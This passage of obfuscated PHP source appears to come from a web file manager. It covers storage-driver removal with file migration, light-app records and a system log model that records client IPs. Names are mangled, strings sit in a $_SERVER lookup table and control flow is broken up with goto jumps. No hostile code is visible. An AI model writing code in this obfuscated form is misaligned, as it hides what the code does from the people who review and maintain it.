1); $Fî…™¢’¥¼ = $Fî…™¢’¥¼[0]; if ($Fî…™¢’¥¼) { $Fî…™¢’¥¼[$càÖŠ±¡‹·[6]] = json_decode($Fî…™¢’¥¼[$càÖŠ±¡‹·[6]], !0); } return $Fî…™¢’¥¼; } public function driverInfo($CÃ¢œøĞÕ) { $A¯‹Ğ±Û¹Ë =& $_SERVER[Š‰]; $d½ñğà”‰Ä = array_to_keyvalue(parent::listData(), $A¯‹Ğ±Û¹Ë[388]); if (!isset($d½ñğà”‰Ä[$CÃ¢œøĞÕ])) { return !1; } $dé£å©÷©“ = $d½ñğà”‰Ä[$CÃ¢œøĞÕ]; $dé£å©÷©“[$A¯‹Ğ±Û¹Ë[6]] = json_decode($dé£å©÷©“[$A¯‹Ğ±Û¹Ë[6]], !0); return $dé£å©÷©“; } public function remove($bòÑÎ‚òê) { $this->removeShareItems($bòÑÎ‚òê); return parent::remove($bòÑÎ‚òê); } public function removeWithFile($a½½¹’£¦, $C¿£Ó·å¤) { goto DƒëĞ¢¯×¦; C‘Ë×ˆ—: if (!$A×»ææòˆ‡) { $cÌ¶÷ÈØÄ->stop($Bšİ¤•‰Œ¾); return !1; } $cÌ¶÷ÈØÄ->end(); if ($C¿£Ó·å¤ == $a…ÎîÒµÜÀ[1629]) { $this->remove($a½½¹’£¦); } goto D÷´îŸ§ãÌ; CìğæÙ¶ğŠ: $EËÖ­‹¨¶Ï = Model($a…ÎîÒµÜÀ[444])->where($e½¸ó„Ï»)->sum($a…ÎîÒµÜÀ[77]); $Bšİ¤•‰Œ¾ = $C¿£Ó·å¤ . $a…ÎîÒµÜÀ[1974] . $a½½¹’£¦; $cÌ¶÷ÈØÄ = new TaskFileTransfer($Bšİ¤•‰Œ¾, $a…ÎîÒµÜÀ[1969], $AÂÁêËŠ, LNG($a…ÎîÒµÜÀ[1975]) . "\50{$a½½¹’£¦}\51"); goto b†Ä‘©Ñ¸; b†Ä‘©Ñ¸: $cÌ¶÷ÈØÄ->task[$a…ÎîÒµÜÀ[711]] = (double) $EËÖ­‹¨¶Ï; $A­·‹Ö¸§ò = KodIO::defaultDriver(); $a¤£¼ÈÕ = $A­·‹Ö¸§ò[$a…ÎîÒµÜÀ[388]]; goto Dóˆ‚¯Ü˜…; Dóˆ‚¯Ü˜…: $cßøù†æ‡á = "\173\151\x6f\72{$a¤£¼ÈÕ}\x7d\57"; $A×»ææòˆ‡ = !0; $fÍ×Øø‰‚ = array(); goto C÷…¦Úê¼Û; DƒëĞ¢¯×¦: $a…ÎîÒµÜÀ =& $_SERVER[Š‰]; $e½¸ó„Ï» = array($a…ÎîÒµÜÀ[768] => $a½½¹’£¦); $AÂÁêËŠ = Model($a…ÎîÒµÜÀ[444])->where($e½¸ó„Ï»)->count(); goto CìğæÙ¶ğŠ; C÷…¦Úê¼Û: $b‘’£‰Â£† = Model($a…ÎîÒµÜÀ[173])->where($e½¸ó„Ï»)->field($a…ÎîÒµÜÀ[1976])->select(); foreach ($b‘’£‰Â£† as $fœĞ—µÂ¤¿) { goto AªœßÅÒ¯Ë; c—Ï¸µ¤¾†: if (IO::exist($eªøò‹‚·)) { $cÌ¶÷ÈØÄ->updateFileEnd($fœĞ—µÂ¤¿[$a…ÎîÒµÜÀ[28]], $fœĞ—µÂ¤¿[$a…ÎîÒµÜÀ[77]]); continue; } if (!IO::move($fùÔÏÅÄİ, get_path_father($eªøò‹‚·))) { $A×»ææòˆ‡ = !1; break; } $e½¸ó„Ï» = array($a…ÎîÒµÜÀ[441] => $fœĞ—µÂ¤¿[$a…ÎîÒµÜÀ[441]]); goto AÎİİä…£; AªœßÅÒ¯Ë: $fùÔÏÅÄİ = $fœĞ—µÂ¤¿[$a…ÎîÒµÜÀ[75]]; $eªøò‹‚· = $cßøù†æ‡á . str_replace("\x7b\x69\x6f\x3a{$a½½¹’£¦}\x7d\57", $a…ÎîÒµÜÀ[33], $fùÔÏÅÄİ); if (!IO::exist($fùÔÏÅÄİ)) { $fÍ×Øø‰‚[] = $fœĞ—µÂ¤¿[$a…ÎîÒµÜÀ[441]]; $cÌ¶÷ÈØÄ->updateFileEnd($fœĞ—µÂ¤¿[$a…ÎîÒµÜÀ[28]], $fœĞ—µÂ¤¿[$a…ÎîÒµÜÀ[77]]); continue; } goto c—Ï¸µ¤¾†; AÎİİä…£: $f¿Ïƒ·è÷” = array($a…ÎîÒµÜÀ[768] => $a¤£¼ÈÕ, $a…ÎîÒµÜÀ[75] => $eªøò‹‚·); Model($a…ÎîÒµÜÀ[173])->where($e½¸ó„Ï»)->save($f¿Ïƒ·è÷”); goto aµá¯‰ê±Ö; aµá¯‰ê±Ö: } $this->removeByFileID($fÍ×Øø‰‚); goto C‘Ë×ˆ—; D÷´îŸ§ãÌ: } public function progress($B¤ïŒÈç®ñ, $b„Ö‚Š¯ñÜ) { return Task::get($b„Ö‚Š¯ñÜ . $_SERVER[Š‰][1974] . $B¤ïŒÈç®ñ); } private function removeByFileID($A¾Œñ…Ç’ = array()) { goto b¼†á¼ƒŠ‹; E“˜»÷åæ‘: $F†÷Ïìë  = Model($EÍŒ…òõÔ¾[1180])->where($d¿Ó‰›Éå)->field($EÍŒ…òõÔ¾[390])->select(); if (!$F†÷Ïìë ) { return; } $F†÷Ïìë  = array_to_keyvalue($F†÷Ïìë , $EÍŒ…òõÔ¾[33], $EÍŒ…òõÔ¾[390]); goto Cãí›‡š×Ç; b¼†á¼ƒŠ‹: $EÍŒ…òõÔ¾ =& $_SERVER[Š‰]; if (empty($A¾Œñ…Ç’)) { return; } $d¿Ó‰›Éå = array($EÍŒ…òõÔ¾[441] => array($EÍŒ…òõÔ¾[7], $A¾Œñ…Ç’)); goto E“˜»÷åæ‘; Cãí›‡š×Ç: foreach ($F†÷Ïìë  as $c“‰¢›‡¬Ó) { Model($EÍŒ…òõÔ¾[403])->removeNow($c“‰¢›‡¬Ó, !1); } goto cĞŞ°ğêÅÌ; cĞŞ°ğêÅÌ: } private function removeShareItems($b÷Ü¢Õ£¦) { goto eÖíšöí²İ; D÷Ší½šÌ: $bêŠ¥Ø¸» = Model($e»ª˜¼‰‚[1640])->where($D¡èº¢îÂ)->field($e»ª˜¼‰‚[462])->select(); if (empty($bêŠ¥Ø¸»)) { return; } $ešŸï ñ¾í = array_to_keyvalue($bêŠ¥Ø¸», $e»ª˜¼‰‚[33], $e»ª˜¼‰‚[462]); goto dŒ²•¡‰ğŒ; dŒ²•¡‰ğŒ: Model($e»ª˜¼‰‚[558])->remove($ešŸï ñ¾í); goto F¼ÑƒêéÖ; eÖíšöí²İ: $e»ª˜¼‰‚ =& $_SERVER[Š‰]; $dåç‹œŠ§ = "\x7b\x69\x6f\72{$b÷Ü¢Õ£¦}\175\57"; $D¡èº¢îÂ = array($e»ª˜¼‰‚[390] => 0, $e»ª˜¼‰‚[1047] => array($e»ª˜¼‰‚[378], "{$dåç‹œŠ§}\45")); goto D÷Ší½šÌ; F¼ÑƒêéÖ: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\x2e\114\151\147\x68\164\101\160\x70"; public $modelType = "\x53\171\163\x74\145\x6d\117\160\x74\x69\x6f\156"; public $field = array("\156\x61\x6d\145", "\147\x72\x6f\165\x70", "\x64\x65\x73\143", "\x63\x6f\156\164\145\156\x74"); public function listData($Eß‚µğÑ½Ô = false, $b‘ÕÄğÌ¨ø = "\x6d\157\x64\x69\x66\171\x54\151\x6d\x65", $eÅàßô´µï = true) { return parent::listData($Eß‚µğÑ½Ô, $b‘ÕÄğÌ¨ø, $eÅàßô´µï); } public function remove($c¡Å‚İÛñ‚) { $EºŞÌˆùĞ” = $this->findByName($c¡Å‚İÛñ‚); if (!$EºŞÌˆùĞ”) { return !1; } return parent::remove($EºŞÌˆùĞ”[$_SERVER[Š‰][388]]); } public function add($e¸¢È ê¤·) { if ($this->findByName($e¸¢È ê¤·[$_SERVER[Š‰][28]])) { return !1; } return parent::insert($e¸¢È ê¤·); } public function update($FÏó·ÖôÊÆ, $eªíÚí²¶¢) { $C¬ÛŠ‚İ×¨ =& $_SERVER[Š‰]; $bµ‚›ÇÅ£İ = $this->findByName($FÏó·ÖôÊÆ); $d®ÊÕ”±ƒ = $this->findByName($eªíÚí²¶¢[$C¬ÛŠ‚İ×¨[28]]); if (!$bµ‚›ÇÅ£İ || $d®ÊÕ”±ƒ && $d®ÊÕ”±ƒ[$C¬ÛŠ‚İ×¨[388]] != $bµ‚›ÇÅ£İ[$C¬ÛŠ‚İ×¨[388]]) { return !1; } return parent::update($bµ‚›ÇÅ£İ[$C¬ÛŠ‚İ×¨[388]], $eªíÚí²¶¢); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\x65\x6d\x5f\154\x6f\x67"; protected $dataAuto = array(array("\143\x72\x65\x61\x74\145\x54\x69\x6d\x65", "\x74\x69\155\145", "\x69\x6e\163\145\x72\164", "\x66\x75\x6e\x63\x74\x69\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Fï¯•í¤ô =& $_SERVER[Š‰]; return array($Fï¯•í¤ô[1977] => LNG($Fï¯•í¤ô[1978]), $Fï¯•í¤ô[1979] => LNG($Fï¯•í¤ô[1980]), $Fï¯•í¤ô[1603] => LNG($Fï¯•í¤ô[1981]), $Fï¯•í¤ô[1982] => LNG($Fï¯•í¤ô[1983]), $Fï¯•í¤ô[1984] => LNG($Fï¯•í¤ô[1985]), $Fï¯•í¤ô[1986] => LNG($Fï¯•í¤ô[1987]), $Fï¯•í¤ô[1988] => LNG($Fï¯•í¤ô[1989]), $Fï¯•í¤ô[1633] => LNG($Fï¯•í¤ô[1989]), $Fï¯•í¤ô[1634] => LNG($Fï¯•í¤ô[1990]), $Fï¯•í¤ô[1991] => LNG($Fï¯•í¤ô[1992]), $Fï¯•í¤ô[1993] => LNG($Fï¯•í¤ô[1994]), $Fï¯•í¤ô[1995] => LNG($Fï¯•í¤ô[1996]), $Fï¯•í¤ô[1997] => LNG($Fï¯•í¤ô[1998]), $Fï¯•í¤ô[1631] => LNG($Fï¯•í¤ô[1999]), $Fï¯•í¤ô[1638] => LNG($Fï¯•í¤ô[2000]), $Fï¯•í¤ô[2001] => LNG($Fï¯•í¤ô[2002]), $Fï¯•í¤ô[2003] => LNG($Fï¯•í¤ô[2004]), $Fï¯•í¤ô[2005] => LNG($Fï¯•í¤ô[2006]), $Fï¯•í¤ô[2007] => LNG($Fï¯•í¤ô[2008]), $Fï¯•í¤ô[1641] => LNG($Fï¯•í¤ô[2009]), $Fï¯•í¤ô[1642] => LNG($Fï¯•í¤ô[2010]), $Fï¯•í¤ô[2011] => LNG($Fï¯•í¤ô[2012]), $Fï¯•í¤ô[2013] => LNG($Fï¯•í¤ô[2014]), $Fï¯•í¤ô[2015] => LNG($Fï¯•í¤ô[2016]), $Fï¯•í¤ô[1636] => LNG($Fï¯•í¤ô[2017]), $Fï¯•í¤ô[2018] => LNG($Fï¯•í¤ô[2019]), $Fï¯•í¤ô[1635] => LNG($Fï¯•í¤ô[2020]), $Fï¯•í¤ô[2021] => LNG($Fï¯•í¤ô[2022]), $Fï¯•í¤ô[2023] => LNG($Fï¯•í¤ô[2024]), $Fï¯•í¤ô[2025] => LNG($Fï¯•í¤ô[2025]), $Fï¯•í¤ô[2026] => LNG($Fï¯•í¤ô[2026]), $Fï¯•í¤ô[2027] => LNG($Fï¯•í¤ô[1607]), $Fï¯•í¤ô[2028] => LNG($Fï¯•í¤ô[2029]), $Fï¯•í¤ô[2030] => LNG($Fï¯•í¤ô[2031]), $Fï¯•í¤ô[2032] => LNG($Fï¯•í¤ô[2033]), $Fï¯•í¤ô[2034] => LNG($Fï¯•í¤ô[2035]), $Fï¯•í¤ô[2036] => LNG($Fï¯•í¤ô[2037]), $Fï¯•í¤ô[2038] => LNG($Fï¯•í¤ô[2038]), $Fï¯•í¤ô[2039] => LNG($Fï¯•í¤ô[2040]), $Fï¯•í¤ô[2041] => LNG($Fï¯•í¤ô[2042]), $Fï¯•í¤ô[2043] => LNG($Fï¯•í¤ô[2044]), $Fï¯•í¤ô[2045] => LNG($Fï¯•í¤ô[2046]), $Fï¯•í¤ô[2047] => LNG($Fï¯•í¤ô[2048]), $Fï¯•í¤ô[2049] => LNG($Fï¯•í¤ô[2050])); } private function typeFile() { $c‰ÎÛ‰šº‚ =& $_SERVER[Š‰]; $eŸ‰‘ÅÂè‚ = array($c‰ÎÛ‰šº‚[1638] => array($c‰ÎÛ‰šº‚[1639]), $c‰ÎÛ‰šº‚[1995] => array($c‰ÎÛ‰šº‚[2051]), $c‰ÎÛ‰šº‚[1997] => array($c‰ÎÛ‰šº‚[2052]), $c‰ÎÛ‰šº‚[1631] => array($c‰ÎÛ‰šº‚[1632]), $c‰ÎÛ‰šº‚[2003] => array(), $c‰ÎÛ‰šº‚[2005] => array(), $c‰ÎÛ‰šº‚[2007] => array(), $c‰ÎÛ‰šº‚[1641] => array($c‰ÎÛ‰šº‚[1643]), $c‰ÎÛ‰šº‚[1642] => array($c‰ÎÛ‰šº‚[1643]), $c‰ÎÛ‰šº‚[2011] => array($c‰ÎÛ‰šº‚[2053]), $c‰ÎÛ‰šº‚[2013] => array($c‰ÎÛ‰šº‚[2053]), $c‰ÎÛ‰šº‚[2015] => array($c‰ÎÛ‰šº‚[2054]), $c‰ÎÛ‰šº‚[2001] => array($c‰ÎÛ‰šº‚[2055]), $c‰ÎÛ‰šº‚[1636] => array($c‰ÎÛ‰šº‚[2056]), $c‰ÎÛ‰šº‚[2018] => array($c‰ÎÛ‰šº‚[2057]), $c‰ÎÛ‰šº‚[1635] => array($c‰ÎÛ‰šº‚[1637])); return $eŸ‰‘ÅÂè‚; } private function typeAll() { goto dºÓ®¼èô¤; dºÓ®¼èô¤: $dô©ÚùİÙ¦ =& $_SERVER[Š‰]; $Aâ³îì­©ò = $this->typeList; $B¬ÆŸâ¼¶ = array_filter($this->typeFile()); goto aĞ³·Î»™„; aĞ³·Î»™„: foreach ($B¬ÆŸâ¼¶ as $A…è¦å•õ£ => $d«ÇŒ‡ÖíÔ) { $Aâ³îì­©ò[$d«ÇŒ‡ÖíÔ[0]] = $Aâ³îì­©ò[$A…è¦å•õ£]; } $Aâ³îì­©ò[$dô©ÚùİÙ¦[1643]] = LNG($dô©ÚùİÙ¦[2058]); $Aâ³îì­©ò[$dô©ÚùİÙ¦[2053]] = LNG($dô©ÚùİÙ¦[2059]); goto A˜Ëä×¢ˆ; A˜Ëä×¢ˆ: return $Aâ³îì­©ò; goto Fš˜×Ÿ¶Á¨; Fš˜×Ÿ¶Á¨: } public function addLog($EÜ¾Åîàˆš, $Eç”ƒ§ˆÄ« = array()) { goto bîÌ‚òƒÅ; e·›­Ş‡Î§: $Eç”ƒ§ˆÄ« = array($BÍë‰ÜõèŒ[1491] => Session::sign(), $BÍë‰ÜõèŒ[1492] => $c›ÍÑİËÓ, $BÍë‰ÜõèŒ[29] => $EÜ¾Åîàˆš, $BÍë‰ÜõèŒ[1494] => json_encode($Eç”ƒ§ˆÄ«)); parent::add($Eç”ƒ§ˆÄ«); goto a…²«“Ôª; AÅ£ñ’”…¬: if (!$c›ÍÑİËÓ) { $c›ÍÑİËÓ = (int) Session::get($BÍë‰ÜõèŒ[1790]); } $aÊº˜Šù«¤ = get_client_ip(); if (!$Eç”ƒ§ˆÄ« || strlen(json_encode($Eç”ƒ§ˆÄ«)) >= 1024) { $Eç”ƒ§ˆÄ« = array($BÍë‰ÜõèŒ[2060] => $aÊº˜Šù«¤); } else { if (is_array($Eç”ƒ§ˆÄ«)) { $Eç”ƒ§ˆÄ«[$BÍë‰ÜõèŒ[2060]] = $aÊº˜Šù«¤; } else { $Eç”ƒ§ˆÄ« = array($BÍë‰ÜõèŒ[1064] => $Eç”ƒ§ˆÄ«, $BÍë‰ÜõèŒ[2060] => $aÊº˜Šù«¤); } } goto e·›­Ş‡Î§; bîÌ‚òƒÅ: $BÍë‰ÜõèŒ =& $_SERVER[Š‰]; if (!isset($this->typeList[$EÜ¾Åîàˆš])) { return; } $c›ÍÑİËÓ = defined($BÍë‰ÜõèŒ[448]) && USER_ID ? USER_ID : (isset($Eç”ƒ§ˆÄ«[$BÍë‰ÜõèŒ[1500]]) ? $Eç”ƒ§ˆÄ«[$BÍë‰ÜõèŒ[1500]] : 0); goto AÅ£ñ’”…¬; a…²«“Ôª: } public function remove($cœ±„â›®) { $this->where(array($_SERVER[Š‰][406] => $cœ±„â›®))->delete(); } private function _makeOrder($d±‹³‘¸Ä› = '') { goto A¿×ĞÄÅïâ; aøëÌÍ»ÍĞ: return $this->order($d±‹³‘¸Ä›); goto fé‘·Ñå º; A¿×ĞÄÅïâ: $c´µº‰¾Š… =& $_SERVER[Š‰]; $C‚™ˆ¾‰š = $c´µº‰¾Š…[192]; $d­³´áÍ„Ù = array($c´µº‰¾Š…[422] => $c´µº‰¾Š…[423], $c´µº‰¾Š…[424] => $c´µº‰¾Š…[425]); goto A¹ì÷áŒ; A¹ì÷áŒ: $d™©éÎäÀ² = Input::get($c´µº‰¾Š…[430], $c´µº‰¾Š…[7], $c´µº‰¾Š…[1822], array($c´µº‰¾Š…[1746], $c´µº‰¾Š…[424])); $d™©éÎäÀ² = $d­³´áÍ„Ù[$d™©éÎäÀ²]; $d±‹³‘¸Ä› = $d±‹³‘¸Ä› . "{$C‚™ˆ¾‰š}\40{$d™©éÎäÀ²}"; goto aøëÌÍ»ÍĞ; fé‘·Ñå º: } public function get($aœôåê·¤ = '') { goto cˆÂäá£Ï; cˆÂäá£Ï: $Fïí®ÎöÀ« =& $_SERVER[Š‰]; if (!$aœôåê·¤) { show_json(array()); } $A™Õ˜Õ–‚ = array(); goto c²«ÌĞ‘; b’ƒ†ôÑ–: $bÊÍ™œÄç¦[$Fïí®ÎöÀ«[365]] = $this->logList($bÊÍ™œÄç¦[$Fïí®ÎöÀ«[365]]); return $bÊÍ™œÄç¦; goto bÚÌÌ÷É¨Ã; c²«ÌĞ‘: if ($aœôåê·¤[$Fïí®ÎöÀ«[1500]]) { $A™Õ˜Õ–‚[$Fïí®ÎöÀ«[1500]] = $aœôåê·¤[$Fïí®ÎöÀ«[1500]]; } if (isset($aœôåê·¤[$Fïí®ÎöÀ«[715]])) { $c¹Ú±·›¿œ = $aœôåê·¤[$Fïí®ÎöÀ«[715]]; $cÖæÍì“Ï» = isset($aœôåê·¤[$Fïí®ÎöÀ«[470]]) ? $aœôåê·¤[$Fïí®ÎöÀ«[470]] : time(); $A™Õ˜Õ–‚[$Fïí®ÎöÀ«[192]] = array($Fïí®ÎöÀ«[329], array($c¹Ú±·›¿œ, $cÖæÍì“Ï»)); } if ($aœôåê·¤[$Fïí®ÎöÀ«[29]]) { $cÁëßç„­ = explode($Fïí®ÎöÀ«[47], $aœôåê·¤[$Fïí®ÎöÀ«[29]]); $FÍãà¡Ìç‰ = $this->typeFile(); $AĞ‡ŠœŠÑƒ = array(); foreach ($cÁëßç„­ as $eÑ¿º”Úç˜) { $AĞ‡ŠœŠÑƒ[] = $eÑ¿º”Úç˜; if (isset($FÍãà¡Ìç‰[$eÑ¿º”Úç˜])) { $AĞ‡ŠœŠÑƒ = array_merge($AĞ‡ŠœŠÑƒ, $FÍãà¡Ìç‰[$eÑ¿º”Úç˜]); } } $AĞ‡ŠœŠÑƒ = array_unique($AĞ‡ŠœŠÑƒ); if ($AĞ‡ŠœŠÑƒ) { $A™Õ˜Õ–‚[$Fïí®ÎöÀ«[29]] = array($Fïí®ÎöÀ«[7], $AĞ‡ŠœŠÑƒ); } } goto Dà¬¬İçå¾; Dà¬¬İçå¾: if (!empty($aœôåê·¤[$Fïí®ÎöÀ«[2060]])) { $A™Õ˜Õ–‚[$Fïí®ÎöÀ«[425]] = array($Fïí®ÎöÀ«[378], "\45{$aœôåê·¤[$Fïí®ÎöÀ«[2060]]}\45"); } $bÊÍ™œÄç¦ = $this->_makeOrder()->where($A™Õ˜Õ–‚)->selectPage(); if (empty($bÊÍ™œÄç¦[$Fïí®ÎöÀ«[365]])) { show_json(array(), !0, $bÊÍ™œÄç¦[$Fïí®ÎöÀ«[362]]); } goto b’ƒ†ôÑ–; bÚÌÌ÷É¨Ã: } private function ipAddress(&$fåïœŞ§Š¾) { $eò‡´ë°Ô† =& $_SERVER[Š‰]; if (!empty($fåïœŞ§Š¾[$eò‡´ë°Ô†[2060]])) { $eÙ“Ï÷— à = IpLocation::get($fåïœŞ§Š¾[$eò‡´ë°Ô†[2060]]); } else { $eÙ“Ï÷— à = LNG($eò‡´ë°Ô†[2061]); } $fåïœŞ§Š¾[$eò‡´ë°Ô†[2062]] = $eÙ“Ï÷— à; } private function descZipDownload($F¼ÑË‰‚¨´, &$fç‰öÛ©) { $bì™³¶´‰ =& $_SERVER[Š‰]; if (!isset($F¼ÑË‰‚¨´[$bì™³¶´‰[2063]])) { return; } $dÙĞ÷±Øø  = json_decode($F¼ÑË‰‚¨´[$bì™³¶´‰[2063]], !0); foreach ($dÙĞ÷±Øø  as $d”ÍŞ£©‰õ) { try { $BùÛã§¥Çœ = IO::infoFull($d”ÍŞ£©‰õ[$bì™³¶´‰[75]]); } catch (Exception $E¹Ï³½âŞÙ) { continue; } $F¼ÑË‰‚¨´[$bì™³¶´‰[75]] = $d”ÍŞ£©‰õ[$bì™³¶´‰[75]]; $fç‰öÛ©[] = $F¼ÑË‰‚¨´[$bì™³¶´‰[390]] = $BùÛã§¥Çœ[$bì™³¶´‰[390]]; $fç‰öÛ©[] = $F¼ÑË‰‚¨´[$bì™³¶´‰[1878]] = $BùÛã§¥Çœ[$bì™³¶´‰[472]]; break; } return $F¼ÑË‰‚¨´; } private function getSourceList(&$D‰¨Šø·¸µ) { $d×ï–¸êÌİ =& $_SERVER[Š‰]; $b›¾…©‚† = array(); foreach ($D‰¨Šø·¸µ as $FØİâŸ¹İÑ => $BĞ«áŒ„ç) { goto aÓ§œÏ‘š; aÓ§œÏ‘š: $E±µŒŸæŒ = json_decode($BĞ«áŒ„ç[$d×ï–¸êÌİ[425]], !0); if ($BĞ«áŒ„ç[$d×ï–¸êÌİ[29]] == $d×ï–¸êÌİ[1634]) { $E±µŒŸæŒ = $this->descZipDownload($E±µŒŸæŒ, $b›¾…©‚†); $D‰¨Šø·¸µ[$FØİâŸ¹İÑ][$d×ï–¸êÌİ[425]] = json_encode($E±µŒŸæŒ); continue; } if (strpos($BĞ«áŒ„ç[$d×ï–¸êÌİ[29]], $d×ï–¸êÌİ[1879]) !== 0) { if (!isset($E±µŒŸæŒ[$d×ï–¸êÌİ[75]]) || strpos($BĞ«áŒ„ç[$d×ï–¸êÌİ[29]], $d×ï–¸êÌİ[2064]) !== 0) { continue; } try { $F¼Òˆ™ö = IO::infoFull($E±µŒŸæŒ[$d×ï–¸êÌİ[75]]); } catch (Exception $DŞ¼¼²µô) { continue; } $b›¾…©‚†[] = $E±µŒŸæŒ[$d×ï–¸êÌİ[390]] = $F¼Òˆ™ö[$d×ï–¸êÌİ[390]]; $b›¾…©‚†[] = $E±µŒŸæŒ[$d×ï–¸êÌİ[1878]] = $F¼Òˆ™ö[$d×ï–¸êÌİ[472]]; $D‰¨Šø·¸µ[$FØİâŸ¹İÑ][$d×ï–¸êÌİ[425]] = json_encode($E±µŒŸæŒ); continue; } goto fÊ‡ò±ÙÍŒ; Bï’ÚàøĞÄ: if ($E±µŒŸæŒ[$d×ï–¸êÌİ[29]] == $d×ï–¸êÌİ[1886]) { $b›¾…©‚†[] = $E±µŒŸæŒ[$d×ï–¸êÌİ[425]][$d×ï–¸êÌİ[390]]; } goto A†ë‡©çë¿; fÊ‡ò±ÙÍŒ: $b›¾…©‚†[] = $E±µŒŸæŒ[$d×ï–¸êÌİ[390]]; $b›¾…©‚†[] = $E±µŒŸæŒ[$d×ï–¸êÌİ[1878]]; if ($E±µŒŸæŒ[$d×ï–¸êÌİ[29]] == $d×ï–¸êÌİ[515]) { $b›¾…©‚†[] = $E±µŒŸæŒ[$d×ï–¸êÌİ[425]][$d×ï–¸êÌİ[1031]]; $b›¾…©‚†[] = $E±µŒŸæŒ[$d×ï–¸êÌİ[425]][$d×ï–¸êÌİ[1032]]; } goto Bï’ÚàøĞÄ; A†ë‡©çë¿: } if (!$b›¾…©‚†) { return array(); } return Model($d×ï–¸êÌİ[775])->sourceListInfo($b›¾…©‚†, !0); } private function logList($Eñ†³£‡õ ) { goto bŒâ‘°´œ–; cğìÁ¤£©Ø: $Dó¦ùÃ„¯† = array(); foreach ($Eñ†³£‡õ  as $b–„ŒÅ‘ó => $dÌÈÓŒ¯á) { goto c„ˆÅ…Ñˆ¾; Fµ´ÁÊ¯Ã…: unset($dÌÈÓŒ¯á[$D×‹£ŸĞŞì[2067]]); $e„õš¢àí[] = $dÌÈÓŒ¯á; goto eâø´«º±; c„ˆÅ…Ñˆ¾: $cº…·¤¦¬Ú = $dÌÈÓŒ¯á[$D×‹£ŸĞŞì[29]]; $FÕ˜²ø×Ó• = isset($e†¬Ì„øò[$dÌÈÓŒ¯á[$D×‹£ŸĞŞì[1500]]]) ? $e†¬Ì„øò[$dÌÈÓŒ¯á[$D×‹£ŸĞŞì[1500]]] : !1; $f’š·ô¾è = strpos($cº…·¤¦¬Ú, $D×‹£ŸĞŞì[2065]) === 0 ? LNG($D×‹£ŸĞŞì[2066]) : LNG($D×‹£ŸĞŞì[2061]); goto b¦èšÂí½®; b¦èšÂí½®: $dÌÈÓŒ¯á[$D×‹£ŸĞŞì[28]] = isset($FÕ˜²ø×Ó•[$D×‹£ŸĞŞì[28]]) ? $FÕ˜²ø×Ó•[$D×‹£ŸĞŞì[28]] : LNG($D×‹£ŸĞŞì[2061]); $dÌÈÓŒ¯á[$D×‹£ŸĞŞì[1927]] = isset($FÕ˜²ø×Ó•[$D×‹£ŸĞŞì[1927]]) ? $FÕ˜²ø×Ó•[$D×‹£ŸĞŞì[1927]] : $D×‹£ŸĞŞì[33]; $dÌÈÓŒ¯á[$D×‹£ŸĞŞì[1405]] = isset($c‰˜®çÑ[$cº…·¤¦¬Ú]) ? $c‰˜®çÑ[$cº…·¤¦¬Ú] : $f’š·ô¾è; goto bé®ß˜Í‘; bé®ß˜Í‘: $dÌÈÓŒ¯á[$D×‹£ŸĞŞì[1821]] = $FÕ˜²ø×Ó•; $Fç¥‹¦”·» = json_decode($dÌÈÓŒ¯á[$D×‹£ŸĞŞì[425]], !0); $dÌÈÓŒ¯á[$D×‹£ŸĞŞì[2060]] = isset($Fç¥‹¦”·»[$D×‹£ŸĞŞì[2060]]) ? $Fç¥‹¦”·»[$D×‹£ŸĞŞì[2060]] : $D×‹£ŸĞŞì[33]; goto C²Å¾¸¸öË; C²Å¾¸¸öË: $this->ipAddress($dÌÈÓŒ¯á); if (strpos($cº…·¤¦¬Ú, $D×‹£ŸĞŞì[1879]) === 0 || isset($Fç¥‹¦”·»[$D×‹£ŸĞŞì[1878]])) { goto dÄˆ¥…ôŞê; d­¾½ÕÌ«: if ($Fç¥‹¦”·»[$D×‹£ŸĞŞì[1891]] && $Fç¥‹¦”·»[$D×‹£ŸĞŞì[1891]][$D×‹£ŸĞŞì[398]] == $D×‹£ŸĞŞì[1145]) { $Dó¦ùÃ„¯†[] = $dÌÈÓŒ¯á[$D×‹£ŸĞŞì[388]]; unset($Eñ†³£‡õ [$b–„ŒÅ‘ó]); continue; } goto D†ñ‡èÔå»; dÄˆ¥…ôŞê: $Fç¥‹¦”·»[$D×‹£ŸĞŞì[84]] = $fœ¹­Ö…²Ñ[$Fç¥‹¦”·»[$D×‹£ŸĞŞì[390]]]; $Fç¥‹¦”·»[$D×‹£ŸĞŞì[1891]] = $fœ¹­Ö…²Ñ[$Fç¥‹¦”·»[$D×‹£ŸĞŞì[1878]]]; if ($Fç¥‹¦”·»[$D×‹£ŸĞŞì[29]] == $D×‹£ŸĞŞì[515]) { $Fç¥‹¦”·»[$D×‹£ŸĞŞì[425]][$D×‹£ŸĞŞì[1031]] = $fœ¹­Ö…²Ñ[$Fç¥‹¦”·»[$D×‹£ŸĞŞì[425]][$D×‹£ŸĞŞì[1031]]]; $Fç¥‹¦”·»[$D×‹£ŸĞŞì[425]][$D×‹£ŸĞŞì[1032]] = $fœ¹­Ö…²Ñ[$Fç¥‹¦”·»[$D×‹£ŸĞŞì[425]][$D×‹£ŸĞŞì[1032]]]; } goto AŸ­¿ô±ÆÊ; AŸ­¿ô±ÆÊ: if ($Fç¥‹¦”·»[$D×‹£ŸĞŞì[29]] == $D×‹£ŸĞŞì[1886]) { $Fç¥‹¦”·»[$D×‹£ŸĞŞì[425]][$D×‹£ŸĞŞì[390]] = $fœ¹­Ö…²Ñ[$Fç¥‹¦”·»[$D×‹£ŸĞŞì[425]][$D×‹£ŸĞŞì[390]]]; } if ($Fç¥‹¦”·»[$D×‹£ŸĞŞì[29]] == $D×‹£ŸĞŞì[1629]) { $Fç¥‹¦”·»[$D×‹£ŸĞŞì[1891]] = $Fç¥‹¦”·»[$D×‹£ŸĞŞì[84]]; $Fç¥‹¦”·»[$D×‹£ŸĞŞì[1878]] = $Fç¥‹¦”·»[$D×‹£ŸĞŞì[1891]][$D×‹£ŸĞŞì[390]]; $Fç¥‹¦”·»[$D×‹£ŸĞŞì[84]] = !1; $Fç¥‹¦”·»[$D×‹£ŸĞŞì[390]] = $D×‹£ŸĞŞì[33]; } if ($Fç¥‹¦”·»[$D×‹£ŸĞŞì[84]] && $Fç¥‹¦”·»[$D×‹£ŸĞŞì[84]][$D×‹£ŸĞŞì[398]] == $D×‹£ŸĞŞì[1145]) { $Dó¦ùÃ„¯†[] = $dÌÈÓŒ¯á[$D×‹£ŸĞŞì[388]]; 